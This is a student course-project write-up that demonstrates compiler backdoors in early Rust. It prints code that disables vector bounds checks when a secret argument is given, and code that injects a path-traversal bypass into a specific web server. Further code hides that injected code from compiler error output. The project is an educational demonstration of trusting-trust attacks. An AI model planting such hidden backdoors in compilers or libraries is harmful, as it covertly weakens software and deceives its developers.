For my final project for [UVa's CS4414 Operating Systems](http://www.rust-class.org) class I decided to show how simple backdoors could work using the [Rust programming language](http://www.rust-lang.org).

The idea here was to have the backdoors coded into the compiler itself, so that compiled code would behave differently based on secret parameters. This project also served as an exercise for me to become familiarized with how compilers are written.

Overall Reflections
===================

My initial goal of compiling the backdoors into the compiler itself, a lá [Ken Thompson](http://cm.bell-labs.com/who/ken/trust.html) was a failure. This is due to how the Rust compiler is compiled:

The Rust compiler is [self-hosting](http://en.wikipedia.org/wiki/Self-hosting), meaning that it compiles itself. To do so, the compilation is divided into several stages. The early stages use a special binary made by the Rust dev team. On one hand, this is good because it prevents people from modifying the fundamental properties of the compiler. On the other, it forces people to trust the Rust dev team. It would be important for anyone to be able to create their own stage snapshots.

Exercise 1
==========

This exercise outlines how a simple buffer overflow could happen. 

A single file in the compiler, /src/libstd/vec.rs, was modified. The key to a buffer overflow is to change some fundamental assumption of the programming language. 


```rust
pub unsafe fn copy_memory<T>(dst: &mut [T], src: &[T],
                                 count: uint) {

        
    let argv: ~[~str] = real_args();
    let mut chrisKeyFound: bool = false;
    for chrisCycle in range(0, argv.len()) {
        if(argv[chrisCycle] == ~"SECRETKEY") {
            chrisKeyFound = true;
        }
    }

    if(!chrisKeyFound) {
        assert!(dst.len() >= count);
        assert!(src.len() >= count);
    }

    do dst.as_mut_buf |p_dst, _len_dst| {
        do src.as_imm_buf |p_src, _len_src| {
            ptr::copy_memory(p_dst, p_src, count)
        }
    }
}
```

Normally, to copy a vector we check its sizes to make sure that the vectors are sufficiently large. However, this code checks to see if the program was executed with `SECRETKEY` as a command-line argument. If so, it does not check for vector size compatability. 

To test this, I created a simple program, vectorOverflow.rs. There are three vectors, First, Second, and Third. Let's execute the program by simply running `./vectorOverflow`. When we copy Third into Second the following happens:

![Before SECRETKEY](http://i.imgur.com/NJgnxQV.png)

We get an error because the length of Second is less than the length of Third. This is the appropriate behavior we would expect. However, let's now execute the program in the following manner: `./vectorOverflow SECRETKEY`:

![After SECRETKEY](http://i.imgur.com/XTxOAeH.png)

We now don't get an error. Third is completely copied into Second. However, since Second is smaller, the contents of Third overflow to First! The particularly interesting thing as well is that First is supposed to be an immutable variable, meaning that once set it cannot be modified.  

Remember: We aren't doing anything different in the vectorOverflow.rs code at all. This will work on any program compiled using this modified compiler if it is executed using `SECRETKEY`.

Additional Notes
----------------

Implememnting this was interesting: std::vec is compiled early on. This means that I didn't have access to std::os, which includes the ability to get command-line variables. To make this work, I had to replicate enough of the std::os functionality within std::vec in order to get this working. Professor Evans said that a way to bypass this would be to have the secret key in the vector buffer itself and check that instead. This is a much better solution since it makes the code I place in std::vec much less suspicious! 

Exercise 2
==========

This exercise is an example of a program-specific attack. It targets the [starting code](https://github.com/cs4414/ps3/blob/master/zhtta.rs) that Weilin wrote for problem set 3. Specifically, 

```rust
let file_path = ~os::getcwd().push(path.replace("/../", "")); 
```

This line prevents a web user from requesting a path that then goes to any reachable path on the server's harddrive (provided that the web server has the necessary permissions). 

However, let's make the following changes to src/libsyntax/parse/mod.rs's `pub fn file_to_filemap(sess: @mut ParseSess, path: &Path, spanopt: Option<Span>)`:

```rust
match io::read_whole_file_str(my_path) {
	Ok(src) => {

		match my_path.to_str().contains("zhtta.rs") {
					true => {
						let new_code = "let mut file_path = ~os::getcwd().push(path.replace(\"/../\", \"\")); match path.contains(\"secretkey\") { true => { let original = os::getcwd(); loop { match os::getcwd().to_str() { ~\"/\" => break, _ => { os::change_dir(&os::getcwd().pop()); println!(\"{:}\", os::getcwd().to_str()); } } } file_path = ~os::getcwd().push(path.replace(\"secretkey\", \"\")); os::change_dir(&original); } false => { } }"; 
						src  = src.replace("let file_path = ~os::getcwd().push(path.replace(\"/../\", \"\"));", new_code);
					}
					false => {}
				}

		println!("{:}", src)
	}
	Err(e) => println!("Error {:}", e)
}
```

If the compiler detects that it is compiling Weilin's code, it will replace the part that checks to make sure we can't request an arbitrary path. If the path requested ends with `secretkey`, then the check is removed. The requested directory is retrieved using a loop to change the current working directory to the base directory, `/`, and then go from there. We then reset the current working directory to the previous cwd so that the systems admin is none the wiser. This is done because we don't have access to `std::path`. Obviously we could easily have the compiler include it, but I thought it would be a neat exercise to try and do it without it.

The compiler replaces the line

```rust
let file_path = ~os::getcwd().push(path.replace(\"/../\", \"\"));
```

with 

```rust
let mut file_path = ~os::getcwd().push(path.replace(\"/../\", \"\")); match path.contains(\"secretkey\") { true => { let original = os::getcwd(); loop { match os::getcwd().to_str() { ~\"/\" => break, _ => { os::change_dir(&os::getcwd().pop()); println!(\"{:}\", os::getcwd().to_str()); } } } file_path = ~os::getcwd().push(path.replace(\"secretkey\", \"\")); os::change_dir(&original); } false => { } }
```

As a single line (this will be important distinction in a bit). However, let's say that the programmer is writing the zhtta server and gets a compiler error:

We do not want the modified code to be displayed as part of the error report that the programmer gets because then s/he would know that something is strange.

To avoid this, we make another small change to the compiler, in src/libsyntax/diagnostic.rs's `fn highlight_lines()`:

```rust
let new_code = "let mut file_path = ~os::getcwd().push(path.replace(\"/../\", \"\")); match path.contains(\"secretkey\") { true => { let original = os::getcwd(); loop { match os::getcwd().to_str() { ~\"/\" => break, _ => { os::change_dir(&os::getcwd().pop()); println!(\"{:}\", os::getcwd().to_str()); } } } file_path = ~os::getcwd().push(path.replace(\"secretkey\", \"\")); os::change_dir(&original); } false => { } }"; 

s = s.replace(new_code, "let file_path = ~os::getcwd().push(path.replace(\"/../\", \"\"));");
```

We switch back the code to the original unedited code for error reporting purposes, and thus the programmer is none the wiser!

![ZHTTA compilation error](http://i.imgur.com/x1Bsg5J.png)

Obviously this attack may not be very practical. If Weilin or another programmer changes even one character in that line, the attack no longer works. However, it makes for an interesting demonstration! 